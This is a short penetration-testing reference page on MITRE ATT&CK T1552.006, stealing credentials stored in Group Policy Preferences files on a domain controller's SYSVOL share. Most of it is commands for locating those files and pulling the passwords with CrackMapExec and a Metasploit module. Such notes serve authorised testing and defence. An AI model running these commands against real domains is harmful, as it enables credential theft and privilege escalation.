---
description: MITRE ATT&CK, Credential Access, Sub-technique T1552.006
---

# Group Policy Preferences

Unsecured credentials in Group Policy Preferences (GPP) can be an easy way to obtain credentials and escalate privileges. GPP's are stored in SYSVOL on domain controllers. However, the real kicker is that any domain user can view the SYSVOL share, obtain the password, and decrypt it within seconds.

### Tactics

```powershell
# Enumerating credentials directory on the SYSVOL share
dir /s * .xml

# Enumerating credentials remotely from SYSVOL
dir /s \\[FQN]\SYSVOL\[FQDN\ | more

# Enumerating credentials remotely using CrackMapExec
crackmapexec smb $ip -u $username -p $password -M gpp_password

# Enumerating credentials remotely using Metasploit
use auxiliary/scanner/smb/smb_enum_gpp
set rhosts $ip
set SMBUser $username
set SMBPass $password
run
```
